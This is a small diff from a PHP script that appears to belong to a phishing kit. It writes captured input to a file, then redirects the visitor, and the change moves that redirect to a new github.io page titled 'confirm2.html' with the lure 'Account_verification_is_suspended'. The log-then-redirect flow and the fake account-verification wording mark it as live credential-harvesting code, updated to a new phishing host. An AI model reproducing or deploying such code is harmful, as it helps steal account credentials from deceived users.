@@ -55,7 +55,7 @@ fwrite($handle, "\n");
 fclose($handle);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-window.location=\"https://adsrewards.github.io/settings/confirm2.html?ref=Account_verification_is_suspended\";
+window.location=\"https://sayabanr.github.io/Confir/confirm2.html?ref=Account_verification_is_suspended\";
 // -->
 </script>";
 ?>
